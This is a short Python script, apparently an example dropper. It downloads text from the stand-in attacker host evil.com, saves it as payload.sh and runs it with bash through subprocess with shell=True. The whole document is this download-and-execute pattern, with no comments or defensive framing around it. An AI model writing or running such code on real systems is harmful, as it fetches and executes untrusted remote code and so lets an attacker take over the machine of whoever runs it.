import requests
import subprocess

data = requests.get("http://evil.com")
with open("payload.sh", "w") as f:
    f.write(data.text)

subprocess.call("bash payload.sh", shell=True)
